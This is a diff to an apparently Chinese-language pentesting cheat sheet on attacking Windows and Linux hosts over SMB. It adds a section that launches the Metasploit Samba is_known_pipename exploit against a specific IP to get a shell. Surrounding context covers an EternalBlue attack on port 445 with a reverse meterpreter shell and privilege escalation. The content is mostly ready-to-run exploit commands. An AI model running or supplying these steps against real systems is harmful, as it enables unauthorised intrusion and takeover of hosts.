@@ -14,6 +14,7 @@ Windows Server 2012
 Windows 10
 Windows Server 2016
 内网IDS不做防护，还可以利用这个漏洞。
+
 ^
 ## **445打永恒之蓝**
 ```
@@ -37,6 +38,24 @@ run  //创建反弹shell，进入meterpreter
 
 meterpreter>对目标机操作，提权等。
 ```
+^
+## **139打samba服务**
+```
+msfconsole
+use exploit/linux/samba/is_known_pipename
+set rhost 172.2.42.6
+exploit 
+直接返回shell
+```
+
+
+
+
+
+
+
+
+^
 meterpreter常用命令操作：
 <https://www.cnblogs.com/crabin/p/17486024.html>
 ```
